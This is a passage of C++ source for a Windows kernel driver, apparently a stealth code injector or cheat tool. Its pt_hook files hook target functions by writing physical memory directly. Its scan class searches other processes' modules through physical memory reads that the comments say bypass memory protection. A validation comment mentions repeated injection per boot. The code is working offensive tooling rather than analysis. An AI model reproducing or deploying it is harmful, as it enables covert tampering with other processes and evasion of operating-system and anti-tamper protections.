   * Uses HDE (Hacker Disassembler Engine) to analyze instruction boundaries
   * and ensure the hook doesn't split instructions. Returns the cumulative
   * size of complete instructions that meet the minimum size requirement.
   */
  auto calculate_hook_size(uintptr_t target_pa, size_t min_size = 12) -> size_t {
    uint8_t buffer[64];
    if (!NT_SUCCESS(physical::read_physical_address(target_pa, buffer, sizeof(buffer)))) {
      return 0;
    }

    size_t total_len = 0;
    while (total_len < min_size && total_len < sizeof(buffer)) {
      hde64s hde;
      HdeDisassemble(&buffer[total_len], &hde);
      if (hde.len == 0)
        break;
      total_len += hde.len;
    }

    return total_len;
  }

  /**
   * @brief Create a trampoline function containing original instructions
   * @param target_va Virtual address of the original function
   * @param target_pa Physical address of the original function
   * @param original_bytes Buffer containing the original instruction bytes
   * @param hook_size Number of bytes being hooked
   * @return Virtual address of the trampoline, or 0 on failure
   *
   * Allocates executable memory and creates a trampoline containing the original
   * instructions followed by a jump back to the continuation point. This allows
   * the original function to be called from hook handlers.
   */
  auto create_trampoline(uintptr_t target_va, uintptr_t target_pa, uint8_t* original_bytes,
                         size_t hook_size) -> uintptr_t {
    // alloc memory for trampoline
    auto trampoline = reinterpret_cast<uint8_t*>(mem::allocate_independent_pages(0x100));
    if (!trampoline) {
      return 0;
    }

    // copy original instructions
    globals::memcpy(trampoline, original_bytes, hook_size);

    // add jump back to original function after hook
    uintptr_t jmp_back = target_va + hook_size;
    globals::memcpy(&trampoline[hook_size], mov_rax_shellcode, sizeof(mov_rax_shellcode));
    globals::memcpy(&trampoline[hook_size + 2], &jmp_back, sizeof(uintptr_t));

    bool set_page_protection = globals::mm_set_page_protection(
        reinterpret_cast<uintptr_t>(trampoline), 0x100, PAGE_EXECUTE_READWRITE);
    if (!set_page_protection) {
      return 0;
    }

    return reinterpret_cast<uintptr_t>(trampoline);
  }

  /**
   * @brief Install a function hook using direct physical memory modification
   * @param pml4_pa Physical address of the target process's PML4 table
   * @param target_va Virtual address of the function to hook
   * @param hook_function Address of the hook handler function
   * @param info Pointer to hook_info structure to store hook metadata
   * @return true if hook installation succeeded, false otherwise
   *
   * Installs a function hook by directly modifying physical memory.
   * Creates a trampoline for calling the original function and
   * overwrites the target with a jump to the hook handler.
   */
  auto install_hook_physical(uintptr_t pml4_pa, uintptr_t target_va, uintptr_t hook_function,
                             pt_hook::hook_info* info) -> bool {
    if (!info)
      return false;

    // get physical address of target
    uintptr_t target_pa = virt_to_phys_via_pml4(pml4_pa, target_va);
    if (!target_pa) {
      log("ERROR", "failed to get physical address for target 0x%llx", target_va);
      return false;
    }

    info->target_va = target_va;
    info->target_pa = target_pa;
    info->hook_function = hook_function;

    // calc hook size
    info->hook_size = calculate_hook_size(target_pa);
    if (!info->hook_size) {
      log("ERROR", "failed to calculate hook size");
      return false;
    }

    log("INFO", "hook size calculated: %zu bytes", info->hook_size);

    // save original bytes
    if (!NT_SUCCESS(
            physical::read_physical_address(target_pa, info->original_bytes, info->hook_size))) {
      log("ERROR", "failed to read original bytes");
      return false;
    }

    // create trampoline
    info->original_function =
        create_trampoline(target_va, target_pa, info->original_bytes, info->hook_size);
    if (!info->original_function) {
      log("ERROR", "failed to create trampoline");
      return false;
    }

    // write hook jump
    uint8_t hook_bytes[12];
    globals::memcpy(hook_bytes, mov_rax_shellcode, sizeof(mov_rax_shellcode));
    globals::memcpy(&hook_bytes[2], &hook_function, sizeof(uintptr_t));

    // apply the hook
    if (!NT_SUCCESS(
            physical::write_physical_address(target_pa, hook_bytes, sizeof(mov_rax_shellcode)))) {
      log("ERROR", "failed to write hook bytes");
      globals::mm_free_independent_pages(info->original_function, 0x100);
      return false;
    }

    // fill remaining bytes with NOPs if needed
    if (info->hook_size > sizeof(mov_rax_shellcode)) {
      uint8_t nops[32];
      globals::memset(nops, 0x90, sizeof(nops));
      size_t nop_count = info->hook_size - sizeof(mov_rax_shellcode);
      if (!NT_SUCCESS(physical::write_physical_address(target_pa + sizeof(mov_rax_shellcode), nops,
                                                       nop_count))) {
        log("WARNING", "failed to write NOP padding");
      }
    }

    info->initialized = true;
    log("SUCCESS", "hook installed at 0x%llx (PA: 0x%llx)", target_va, target_pa);
    return true;
  }

  /**
   * @brief Remove a previously installed hook and restore original function
   * @param info Pointer to hook_info structure containing hook metadata
   * @return true if hook removal succeeded, false otherwise
   *
   * Restores the original function bytes from the saved copy and frees
   * the allocated trampoline memory. Completely reverses the hook installation.
   */
  auto remove_hook_physical(hook_info* info) -> bool {
    if (!info || !info->initialized)
      return false;

    // restore original bytes
    if (!NT_SUCCESS(physical::write_physical_address(info->target_pa, info->original_bytes,
                                                     info->hook_size))) {
      log("ERROR", "failed to restore original bytes");
      return false;
    }

    // free trampoline
    if (info->original_function) {
      globals::mm_free_independent_pages(info->original_function, 0x100);
    }

    info->initialized = false;
    log("SUCCESS", "hook removed from 0x%llx", info->target_va);
    return true;
  }

}  // namespace pt_hook

```

`driver/mem/pt_hook.hpp`:

```hpp
#pragma once

namespace pt_hook {

  struct hook_info {
    uintptr_t target_va;
    uintptr_t target_pa;
    uintptr_t hook_function;
    uintptr_t original_function;
    uint8_t original_bytes[32];
    size_t hook_size;
    bool initialized;
  };

  /**
   * @brief Translate virtual address to physical address using page table walking
   * @param pml4_pa Physical address of the PML4 table (CR3 register value)
   * @param va Virtual address to translate
   * @return Physical address, or 0 if translation fails
   *
   * Manually walks the page table hierarchy (PML4->PDPT->PD->PT) to perform
   * virtual-to-physical address translation. Supports 4KB pages, 2MB large pages,
   * and 1GB huge pages with proper detection at each level.
   */
  auto virt_to_phys_via_pml4(uintptr_t pml4_pa, uintptr_t va) -> uintptr_t;

  /**
   * @brief Calculate the minimum number of bytes needed for hook installation
   * @param target_pa Physical address of the target function
   * @param min_size Minimum required size for the hook (default: 12 bytes)
   * @return Total size in bytes, or 0 if disassembly fails
   *
   * Uses HDE (Hacker Disassembler Engine) to analyze instruction boundaries
   * and ensure the hook doesn't split instructions. Returns the cumulative
   * size of complete instructions that meet the minimum size requirement.
   */
  auto calculate_hook_size(uintptr_t target_pa, size_t min_size = 12) -> size_t;

  /**
   * @brief Create a trampoline function containing original instructions
   * @param target_va Virtual address of the original function
   * @param target_pa Physical address of the original function
   * @param original_bytes Buffer containing the original instruction bytes
   * @param hook_size Number of bytes being hooked
   * @return Virtual address of the trampoline, or 0 on failure
   *
   * Allocates executable memory and creates a trampoline containing the original
   * instructions followed by a jump back to the continuation point. This allows
   * the original function to be called from hook handlers.
   */
  auto create_trampoline(uintptr_t target_va, uintptr_t target_pa, uint8_t* original_bytes,
                         size_t hook_size) -> uintptr_t;

  /**
   * @brief Install a function hook using direct physical memory modification
   * @param pml4_pa Physical address of the target process's PML4 table
   * @param target_va Virtual address of the function to hook
   * @param hook_function Address of the hook handler function
   * @param info Pointer to hook_info structure to store hook metadata
   * @return true if hook installation succeeded, false otherwise
   *
   * Installs a function hook by directly modifying physical memory.
   * Creates a trampoline for calling the original function and
   * overwrites the target with a jump to the hook handler.
   */
  auto install_hook_physical(uintptr_t pml4_pa, uintptr_t target_va, uintptr_t hook_function,
                             hook_info* info) -> bool;

  /**
   * @brief Remove a previously installed hook and restore original function
   * @param info Pointer to hook_info structure containing hook metadata
   * @return true if hook removal succeeded, false otherwise
   *
   * Restores the original function bytes from the saved copy and frees
   * the allocated trampoline memory. Completely reverses the hook installation.
   */
  auto remove_hook_physical(hook_info* info) -> bool;

}  // namespace pt_hook

```

`driver/mem/scan.hpp`:

```hpp
class scan {
private:
  ULONG_PTR m_base_address;
  const char* m_pattern;
  ULONG_PTR m_pattern_address;

  struct pattern_info {
    UCHAR* bytes;
    BOOLEAN* mask;
    SIZE_T length;
  };

  /**
   * @brief Convert hexadecimal character to integer value
   * @param c Hexadecimal character ('0'-'9', 'a'-'f', 'A'-'F')
   * @return Integer value (0-15), or 0 for invalid characters
   *
   * Helper function for parsing hexadecimal patterns during byte sequence
   * conversion.
   */
  static int hex_to_int(char c) {
    if (c >= '0' && c <= '9')
      return c - '0';
    if (c >= 'a' && c <= 'f')
      return c - 'a' + 10;
    if (c >= 'A' && c <= 'F')
      return c - 'A' + 10;
    return 0;
  }

  /**
   * @brief Parse pattern string into byte array and mask for searching
   * @param pattern Pattern string with hex bytes and wildcards (e.g., "48 8B ?
   * ? 05")
   * @return pattern_info structure containing parsed bytes, mask, and length
   *
   * Converts human-readable pattern strings into searchable byte arrays.
   * Wildcards ('?') are marked in the mask array for flexible matching.
   * Allocates memory that must be freed by the caller.
   */
  static pattern_info parse_pattern(const char* pattern) {
    pattern_info info = {nullptr, nullptr, 0};
    SIZE_T temp_len = globals::strlen(pattern);
    SIZE_T byte_count = 0;
    for (SIZE_T i = 0; i < temp_len; ++i) {
      if (pattern[i] == ' ')
        continue;
      byte_count++;
      if (pattern[i] != '?') {
        i++;
      }
    }

    info.bytes = (UCHAR*)globals::ex_allocate_pool2(POOL_FLAG_NON_PAGED, byte_count, 'nrtp');
    info.mask = (BOOLEAN*)globals::ex_allocate_pool2(POOL_FLAG_NON_PAGED, byte_count, 'ksam');

    if (!info.bytes || !info.mask) {
      if (info.bytes)
        globals::ex_free_pool_with_tag(info.bytes, 0);
      if (info.mask)
        globals::ex_free_pool_with_tag(info.mask, 0);
      return info;
    }

    SIZE_T j = 0;
    for (SIZE_T i = 0; i < temp_len; i++) {
      if (pattern[i] == ' ')
        continue;

      if (pattern[i] == '?') {
        info.bytes[j] = 0;
        info.mask[j] = FALSE;
      } else {
        info.bytes[j] = (hex_to_int(pattern[i]) << 4) | hex_to_int(pattern[i + 1]);
        info.mask[j] = TRUE;
        i++;
      }
      j++;
    }

    info.length = j;
    return info;
  }

  /**
   * @brief Search for byte pattern within a module's memory space
   * @param module_base Base address of the target module
   * @param pattern Pattern string to search for
   * @return Address of first match, or 0 if not found
   *
   * Performs efficient and safe pattern matching within a kernel module by
   * iterating over its PE sections and only scanning executable and
   * non-pageable memory to prevent page faults.
   */
  uintptr_t find_pattern(uintptr_t module_base, const char* pattern) {
    if (!module_base)
      return 0;

    pattern_info info = parse_pattern(pattern);
    if (!info.bytes || !info.mask)
      return 0;

    const auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(module_base);
    const auto nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(module_base + dos_header->e_lfanew);
    const auto section_header = IMAGE_FIRST_SECTION(nt_headers);

    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
      const auto& section = section_header[i];
      if ((section.Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
          !(section.Characteristics & IMAGE_SCN_MEM_DISCARDABLE)) {
        const UCHAR* section_start =
            reinterpret_cast<const UCHAR*>(module_base + section.VirtualAddress);
        const SIZE_T section_size = section.Misc.VirtualSize;

        if (section_size < info.length) {
          continue;
        }

        for (SIZE_T j = 0; j <= section_size - info.length; ++j) {
          BOOLEAN found = TRUE;
          for (SIZE_T k = 0; k < info.length; ++k) {
            if (info.mask[k] && section_start[j + k] != info.bytes[k]) {
              found = FALSE;
              break;
            }
          }

          if (found) {
            globals::ex_free_pool_with_tag(info.bytes, 0);
            globals::ex_free_pool_with_tag(info.mask, 0);
            return reinterpret_cast<uintptr_t>(section_start + j);
          }
        }
      }
    }

    globals::ex_free_pool_with_tag(info.bytes, 0);
    globals::ex_free_pool_with_tag(info.mask, 0);
    return 0;
  }

  /**
   * @brief Resolve a RIP-relative address from an instruction
   * @param address The address of the instruction
   * @param offset_from_opcode The offset within the instruction to the 4-byte relative offset
   * @param instruction_length The total length of the instruction
   * @return The calculated absolute address
   */
  static ULONG_PTR resolve_relative_address(ULONG_PTR address, ULONG offset_from_opcode,
                                            ULONG instruction_length) {
    if (!address)
      return 0;
    LONG relative_offset = *(PLONG)(address + offset_from_opcode);
    return address + instruction_length + relative_offset;
  }

  /**
   * @brief Type-safe casting with template specialization support
   * @tparam T Target type for casting
   * @param value Source value to cast
   * @return Value cast to target type
   */
  template <typename T>
  static T safe_cast(ULONG_PTR value) {
    return (T)value;
  }

public:
  /**
   * @brief Construct pattern scanner for specified module and signature
   * @param base_address Base address of target module
   * @param pattern Byte pattern string to search for
   *
   * Initializes scanner and immediately performs pattern search.
   * Results can be retrieved using accessor methods or conversion operators.
   */
  scan(ULONG_PTR base_address, const char* pattern)
      : m_base_address(base_address), m_pattern(pattern) {
    m_pattern_address = find_pattern(m_base_address, m_pattern);
  }

  /**
   * @brief Get the raw address where pattern was found
   * @return Address of pattern match, or 0 if not found
   *
   * Returns the exact memory location where the byte pattern was located
   * without any additional processing or resolution.
   */
  ULONG_PTR get_pattern_address() const {
    return m_pattern_address;
  }

  /**
   * @brief Resolve CALL instruction target address
   * @tparam T Return type for resolved address
   * @param offset Offset from pattern start to CALL instruction
   * @param instruction_length Length of CALL instruction (default: 5 bytes)
   * @return Resolved target address of the CALL instruction
   */
  template <typename T = ULONG_PTR>
  T resolve_call(ULONG offset = 0, ULONG instruction_length = 5) {
    if (!m_pattern_address)
      return T{};
    ULONG_PTR resolved =
        resolve_relative_address(m_pattern_address + offset, 1, instruction_length);
    return safe_cast<T>(resolved);
  }

  /**
   * @brief Resolve MOV instruction operand address
   * @tparam T Return type for resolved address
   * @param offset Offset from pattern start to MOV instruction
   * @param instruction_length Length of MOV instruction (default: 7 bytes)
   * @return Resolved operand address of the MOV instruction
   */
  template <typename T = ULONG_PTR>
  T resolve_mov(ULONG offset = 0, ULONG instruction_length = 7) {
    if (!m_pattern_address)
      return T{};
    ULONG_PTR resolved =
        resolve_relative_address(m_pattern_address + offset, 3, instruction_length);
    return safe_cast<T>(resolved);
  }

  /**
   * @brief Resolve TEST instruction operand address
   * @tparam T Return type for resolved address
   * @param offset Offset from pattern start to TEST instruction
   * @param instruction_length Length of TEST instruction (default: 6 bytes)
   * @return Resolved operand address of the TEST instruction
   */
  template <typename T = ULONG_PTR>
  T resolve_test(ULONG offset = 0, ULONG instruction_length = 6) {
    if (!m_pattern_address)
      return T{};
    ULONG_PTR resolved =
        resolve_relative_address(m_pattern_address + offset, 2, instruction_length);
    return safe_cast<T>(resolved);
  }

  /**
   * @brief Resolve LEA instruction effective address
   * @tparam T Return type for resolved address
   * @param offset Offset from pattern start to LEA instruction
   * @param instruction_length Length of LEA instruction (default: 7 bytes)
   * @return Resolved effective address from LEA instruction
   */
  template <typename T = ULONG_PTR>
  T resolve_lea(ULONG offset = 0, ULONG instruction_length = 7) {
    if (!m_pattern_address)
      return T{};
    ULONG_PTR resolved =
        resolve_relative_address(m_pattern_address + offset, 3, instruction_length);
    return safe_cast<T>(resolved);
  }

  /**
   * @brief Resolve custom relative addressing with specified parameters
   * @tparam T Return type for resolved address
   * @param offset Offset to relative operand within instruction
   * @param instruction_length Total instruction length
   * @return Resolved absolute address
   */
  template <typename T = ULONG_PTR>
  T resolve_relative(ULONG offset, ULONG instruction_length) {
    if (!m_pattern_address)
      return T{};
    ULONG_PTR resolved = resolve_relative_address(m_pattern_address, offset, instruction_length);
    return safe_cast<T>(resolved);
  }

  /**
   * @brief Apply custom resolution logic using user-provided function
   * @tparam T Return type for resolved value
   * @tparam custom_resolver Type of custom resolver function
   * @param resolver Custom function to process the pattern address
   * @param offset Offset from pattern start to apply resolver
   * @return Result of custom resolver function
   */
  template <typename T = ULONG_PTR, typename custom_resolver>
  T resolve_custom(custom_resolver resolver, ULONG offset = 0) {
    if (!m_pattern_address)
      return T{};
    return safe_cast<T>(resolver(m_pattern_address + offset));
  }

  /**
   * @brief Boolean conversion operator for pattern match validation
   * @return true if pattern was found, false otherwise
   *
   * Allows scanner objects to be used in boolean contexts to check
   * if the pattern search was successful.
   */
  operator bool() const {
    return m_pattern_address != 0;
  }

  /**
   * @brief Search for pattern within a memory buffer
   * @param buffer Memory buffer to search within
   * @param size Size of the memory buffer
   * @param pattern Pattern string (e.g., "48 8B ? ? 05")
   * @return Offset within buffer where pattern was found, or 0 if not found
   *
   * Static utility function for pattern matching within arbitrary memory
   * buffers using wildcard support.
   */
  static uintptr_t ida_findpattern_buffer(void* buffer, size_t size, const char* pattern) {
    pattern_info info = parse_pattern(pattern);
    if (!info.bytes || !info.mask || size < info.length) {
      if (info.bytes)
        globals::ex_free_pool_with_tag(info.bytes, 0);
      if (info.mask)
        globals::ex_free_pool_with_tag(info.mask, 0);
      return 0;
    }

    const auto buffer_bytes = reinterpret_cast<uint8_t*>(buffer);

    for (uintptr_t i = 0; i <= size - info.length; i++) {
      bool found = true;
      for (size_t j = 0; j < info.length; j++) {
        if (info.mask[j] && buffer_bytes[i + j] != info.bytes[j]) {
          found = false;
          break;
        }
      }
      if (found) {
        globals::ex_free_pool_with_tag(info.bytes, 0);
        globals::ex_free_pool_with_tag(info.mask, 0);
        return i;
      }
    }

    globals::ex_free_pool_with_tag(info.bytes, 0);
    globals::ex_free_pool_with_tag(info.mask, 0);
    return 0;
  }

  /**
   * @brief Search for pattern within user-mode process module
   * @param pid Target process ID
   * @param mod_name Module name to search within (e.g., L"ntdll.dll")
   * @param pattern Byte pattern string to search for
   * @param r_addr Output parameter for found address
   * @return NTSTATUS indicating success or failure
   *
   * Comprehensive pattern scanning function that locates modules within
   * target processes and performs page-by-page pattern matching using
   * physical memory reads to bypass memory protection mechanisms.
   */
  static auto find_pattern_usermode(uint32_t pid, const wchar_t* mod_name, const char* pattern,
                                    uintptr_t& r_addr) -> NTSTATUS {
    PEPROCESS target_proc;
    NTSTATUS status =
        globals::ps_lookup_process_by_process_id(reinterpret_cast<HANDLE>(pid), &target_proc);
    if (!NT_SUCCESS(status)) {
      return status;
    }

    uintptr_t base = 0;
    uintptr_t module_size = 0;
    PPEB peb_address = globals::ps_get_process_peb(target_proc);
    if (!peb_address) {
      globals::obf_dereference_object(target_proc);
      return STATUS_NOT_FOUND;
    }

    PEB peb;
    physical::read_process_memory(target_proc, reinterpret_cast<uintptr_t>(peb_address), &peb,
                                  sizeof(PEB));

    if (!peb.Ldr || !peb.Ldr->Initialized) {
      globals::obf_dereference_object(target_proc);
      return STATUS_NOT_FOUND;
    }

    UNICODE_STRING module_name_unicode;
    globals::rtl_init_unicode_string(&module_name_unicode, mod_name);

    PEB_LDR_DATA ldr_data{};
    physical::read_process_memory(target_proc, reinterpret_cast<uintptr_t>(peb.Ldr), &ldr_data,
                                  sizeof(PEB_LDR_DATA));

    PLIST_ENTRY current_entry = ldr_data.InLoadOrderModuleList.Flink;
    PLIST_ENTRY first_entry = current_entry;

    do {
      LDR_DATA_TABLE_ENTRY entry{};
      physical::read_process_memory(target_proc,
                                    reinterpret_cast<uintptr_t>(CONTAINING_RECORD(
                                        current_entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks)),
                                    &entry, sizeof(LDR_DATA_TABLE_ENTRY));

      WCHAR dll_name[256]{};
      if (entry.BaseDllName.Length > 0 && entry.BaseDllName.Buffer) {
        physical::read_process_memory(
            target_proc, reinterpret_cast<uintptr_t>(entry.BaseDllName.Buffer), dll_name,
            min(entry.BaseDllName.Length, static_cast<USHORT>(sizeof(dll_name) - sizeof(WCHAR))));

        UNICODE_STRING dll_name_unicode{};
        dll_name_unicode.Length = entry.BaseDllName.Length;
        dll_name_unicode.MaximumLength = entry.BaseDllName.MaximumLength;
        dll_name_unicode.Buffer = dll_name;

        if (globals::rtl_compare_unicode_string(&dll_name_unicode, &module_name_unicode, TRUE) ==
            0) {
          base = reinterpret_cast<uintptr_t>(entry.DllBase);
          module_size = entry.SizeOfImage;
          break;
        }
      }

      LIST_ENTRY next_entry;
      physical::read_process_memory(target_proc, reinterpret_cast<uintptr_t>(current_entry),
                                    &next_entry, sizeof(LIST_ENTRY));
      current_entry = next_entry.Flink;

    } while (current_entry != first_entry);

    if (!base || !module_size) {
      globals::obf_dereference_object(target_proc);
      return STATUS_NOT_FOUND;
    }

    const auto end = base + module_size;
    void* temp_buffer = globals::mm_allocate_independent_pages_ex(PAGE_SIZE, -1, 0, 0);
    if (!temp_buffer) {
      globals::obf_dereference_object(target_proc);
      return STATUS_INSUFFICIENT_RESOURCES;
    }

    for (auto current_address = base; current_address < end; current_address += PAGE_SIZE) {
      globals::memset(temp_buffer, 0, PAGE_SIZE);

      NTSTATUS read_status = physical::read_process_memory(
          target_proc, current_address, temp_buffer, min(PAGE_SIZE, end - current_address));

      if (!NT_SUCCESS(read_status)) {
        continue;
      }

      const auto scan_size = min(PAGE_SIZE, end - current_address);
      const auto pattern_offset = ida_findpattern_buffer(temp_buffer, scan_size, pattern);

      if (pattern_offset) {
        const auto address = current_address + pattern_offset;
        r_addr = address;
        globals::mm_free_independent_pages(reinterpret_cast<uintptr_t>(temp_buffer), PAGE_SIZE);
        globals::obf_dereference_object(target_proc);
        return STATUS_SUCCESS;
      }
    }

    r_addr = 0;
    globals::mm_free_independent_pages(reinterpret_cast<uintptr_t>(temp_buffer), PAGE_SIZE);
    globals::obf_dereference_object(target_proc);
    return STATUS_NOT_FOUND;
  }
};
```

`driver/mem/validation.cpp`:

```cpp
#pragma once
#include "validation.hpp"
namespace validation {

  auto virtual_to_physical(void* virtual_address) -> PHYSICAL_ADDRESS {
    PHYSICAL_ADDRESS physical_address{0};
    const uintptr_t va = reinterpret_cast<uintptr_t>(virtual_address);

    // check for 2MB page (PDE large page)
    PDE_2MB_64* pde = reinterpret_cast<PDE_2MB_64*>(globals::mi_get_pde_address(va));
    if (pde && pde->Present && pde->LargePage) {
      const uintptr_t pfn = pde->PageFrameNumber;
      physical_address.QuadPart = (pfn << 21) | (va & 0x1FFFFF);
      return physical_address;
    }

    // fall back to regular 4KB page
    PTE_64* const pte = reinterpret_cast<PTE_64*>(globals::mi_get_pte_address(va));
    if (!pte || !pte->Present) {
      return physical_address;
    }

    const uintptr_t pfn = pte->PageFrameNumber;

    physical_address.QuadPart = (pfn << PAGE_SHIFT) | (va & 0xFFF);
    return physical_address;
  }

  auto is_pfn_valid(uintptr_t pfn) -> bool {
    // since manipulate_system_partition messes with physical memory ranges, this is necessary for
    // the function to proceed if injecting more than once per boot
    if (static_cast<experimental_options>(globals::experimental_options) !=
        experimental_options::NONE) {
      log("SUCCESS", "skipped is_pfn_valid check on PFN 0x%llx due to experimental_options", pfn);
      return true;
    }

    return pfn >= globals::mm_lowest_physical_page && pfn <= globals::mm_highest_physical_page;
  }

  auto is_physical_address_valid(uintptr_t physical_address) -> bool {
    auto pfn = PAGE_TO_PFN(physical_address);
    return is_pfn_valid(pfn);
  }

  auto is_virtual_address_valid(void* virtual_address) -> bool {
    return virtual_address && globals::mm_is_address_valid(virtual_address);
  }

  auto validate_allocated_page(void* virtual_address, const char* page_type) -> NTSTATUS {
    if (!virtual_address) {
      log("ERROR", "failed to allocate %s", page_type);
      return STATUS_NO_MEMORY;
    }

    if (!is_virtual_address_valid(virtual_address)) {
      log("ERROR", "allocated %s 0x%p is not valid", page_type, virtual_address);
      return STATUS_INVALID_ADDRESS;
    }

    auto phys_addr = validation::virtual_to_physical(virtual_address);
    if (phys_addr.QuadPart == 0) {
      log("ERROR", "failed to get physical address for %s 0x%p", page_type, virtual_address);
      return STATUS_INVALID_ADDRESS;
    }

    auto pfn = PAGE_TO_PFN(phys_addr.QuadPart);
    if (!is_pfn_valid(pfn)) {
      log("ERROR", "%s PFN 0x%llx outside valid range [0x%llx-0x%llx]", page_type, pfn,
          globals::mm_lowest_physical_page, globals::mm_highest_physical_page);
      return STATUS_INVALID_ADDRESS;
    }

    return STATUS_SUCCESS;
  }

  auto validate_page_table_index(uint32_t index, const char* table_type) -> bool {
    if (index >= 512) {
      log("ERROR", "invalid %s index: %u", table_type, index);
      return false;
    }
    return true;
  }

  auto validate_pfn_with_context(uintptr_t pfn, const char* context) -> bool {
    if (!is_pfn_valid(pfn)) {
      log("ERROR", "%s PFN 0x%llx outside valid range [0x%llx-0x%llx]", context, pfn,
          globals::mm_lowest_physical_page, globals::mm_highest_physical_page);
      return false;
    }
    return true;
  }

  auto validate_process_state(PEPROCESS process, uint32_t pid) -> bool {
    if (!process) {
      log("ERROR", "process %u is null", pid);
      return false;
    }

    if (globals::ps_get_process_exit_status(process) != STATUS_PENDING) {
      log("ERROR", "process %u is not active (exit status: 0x%08X)", pid,
          globals::ps_get_process_exit_status(process));
      return false;
    }

    return true;
  }

  auto acquire_process_rundown_protection(PEPROCESS process, uint32_t pid) -> bool {
    if (!process) {
      log("ERROR", "process %u is null for rundown protection", pid);
      return false;
    }

    // try to acquire rundown protection
    if (!NT_SUCCESS(globals::ps_acquire_process_exit_synchronization(process))) {
      log("ERROR", "failed to acquire rundown protection for process %u", pid);
      return false;
    }

    // double-check process is still active after acquiring protection
    if (globals::ps_get_process_exit_status(process) != STATUS_PENDING) {
      globals::ps_release_process_exit_synchronization(process);
      log("ERROR", "process %u exited after acquiring rundown protection", pid);
      return false;
    }

    return true;
  }

  auto release_process_rundown_protection(PEPROCESS process) -> void {
    if (process) {
      globals::ps_release_process_exit_synchronization(process);
    }
  }

  auto validate_size_parameters(size_t size, size_t page_count, size_t max_size) -> bool {
    if (size == 0) {
      log("ERROR", "invalid size: 0");
      return false;
    }

    if (size > max_size) {
      log("ERROR", "size %zu exceeds maximum %zu", size, max_size);
      return false;
    }

    if (page_count == 0) {
      log("ERROR", "invalid page count: 0");
      return false;
    }

    if (page_count > 0x200000) {  // reasonable max
      log("ERROR", "page count %zu exceeds reasonable maximum", page_count);
      return false;
    }

    return true;
  }

  auto validate_index_range(uint32_t start_idx, uint32_t end_idx, const char* range_type) -> bool {
    if (start_idx >= 512 || end_idx > 512) {
      log("ERROR", "invalid %s index range bounds: %u-%u (max 511)", range_type, start_idx,
          end_idx);
      return false;
    }

    if (start_idx >= end_idx) {
      log("ERROR", "invalid %s index range order: %u >= %u", range_type, start_idx, end_idx);
      return false;
    }

    return true;
  }

  auto validate_virtual_address_alignment(uintptr_t va, size_t alignment, const char* context)
      -> bool {
    if ((va & (alignment - 1)) != 0) {
      log("ERROR", "unaligned %s VA: 0x%llx (alignment: 0x%zx)", context, va, alignment);
      return false;
    }
    return true;
  }
}  // namespace validation
```

`driver/mem/validation.hpp`:

```hpp
#pragma once
#include "../def/globals.hpp"
namespace validation {

  auto virtual_to_physical(void* virtual_address) -> PHYSICAL_ADDRESS;

  auto is_pfn_valid(uintptr_t pfn) -> bool;

  auto is_physical_address_valid(uintptr_t physical_address) -> bool;

  auto is_virtual_address_valid(void* virtual_address) -> bool;

  auto validate_allocated_page(void* virtual_address, const char* page_type) -> NTSTATUS;

  auto validate_page_table_index(uint32_t index, const char* table_type) -> bool;

  auto validate_pfn_with_context(uintptr_t pfn, const char* context) -> bool;

  auto validate_process_state(PEPROCESS process, uint32_t pid) -> bool;

  auto acquire_process_rundown_protection(PEPROCESS process, uint32_t pid) -> bool;

  auto release_process_rundown_protection(PEPROCESS process) -> void;

  auto validate_size_parameters(size_t size, size_t page_count, size_t max_size = 0x40000000000ULL)
      -> bool;

  auto validate_index_range(uint32_t start_idx, uint32_t end_idx, const char* range_type) -> bool;

  auto validate_virtual_address_alignment(uintptr_t va, size_t alignment, const char* context)
      -> bool;

}  // namespace validation
```

`driver/utils/intrin.cpp`:

```cpp
#pragma once
#include "../def/globals.hpp"
/**
 * @brief Namespace containing intrinsic functions for low-level CPU operations
 *
 * This namespace provides cross-platform wrappers for CPU intrinsics and inline assembly,
 * supporting both MSVC and GCC/Clang compilers. All functions are intended for kernel-mode
 * or privileged code execution.
 */
namespace intrin {
#if defined(_MSC_VER) && !defined(__clang__)
  #include <intrin.h>
#endif

  /**
   * @brief Read the CR3 control register
   *
   * The CR3 register contains the physical address of the page directory base register (PDBR)
   * for the currently active page table. This is used by the Memory Management Unit (MMU)
   * for virtual-to-physical address translation.
   *
   * @return The current value of the CR3 register as a pointer-sized integer
   */
  uintptr_t readcr3(void) {
#if defined(_MSC_VER) && !defined(__clang__)
    return __readcr3();
#elif defined(__clang__)
    uintptr_t cr3_value;
    asm volatile("mov %%cr3, %0" : "=r"(cr3_value));
    return cr3_value;
#else
    uintptr_t cr3_value;
    asm volatile("mov %%cr3, %0" : "=r"(cr3_value));
    return cr3_value;
#endif
  }

  /**
   * @brief Get the maximum physical address width supported by the processor
   *
   * Executes CPUID with EAX=80000008h to query processor capabilities.
   * The returned value indicates how many bits are used for physical addressing.
   *
   * @return Number of physical address bits supported (typically 36, 39, 48, or 52)
   */
  uint32_t get_maxphyaddr(void) {
#if defined(_MSC_VER) && !defined(__clang__)
    int cpuid_result[4];
    __cpuid(cpuid_result, 0x80000008);
    return cpuid_result[0] & 0xFF;  // EAX bits 7:0 = physical address bits
#elif defined(__clang__)
    uint32_t eax, ebx, ecx, edx;
    asm volatile("movl $0x80000008, %%eax\n\t"
                 "cpuid"
                 : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
                 :
                 : "memory");
    return eax & 0xFF;
#else
    uint32_t eax, ebx, ecx, edx;
    asm volatile("movl $0x80000008, %%eax\n\t"
                 "cpuid"
                 : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
                 :
                 : "memory");
    return eax & 0xFF;
#endif
  }

  /**
   * @brief Check if the processor supports 1GB pages
   *
   * Queries CPUID function 80000001h to check for PDPE1GB support.
   * 1GB pages allow mapping large contiguous memory regions more efficiently
   * by reducing TLB pressure and page table overhead.
   *
   * @return true if 1GB pages are supported, false otherwise
   */
  bool supports_1gb_pages(void) {
#if defined(_MSC_VER) && !defined(__clang__)
    int cpuid_result[4];
    __cpuid(cpuid_result, 0x80000001);
    return (cpuid_result[3] >> 26) & 1;  // EDX bit 26 = PDPE1GB
#elif defined(__clang__)
    uint32_t eax, ebx, ecx, edx;
    asm volatile("movl $0x80000001, %%eax\n\t"
                 "cpuid"
                 : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
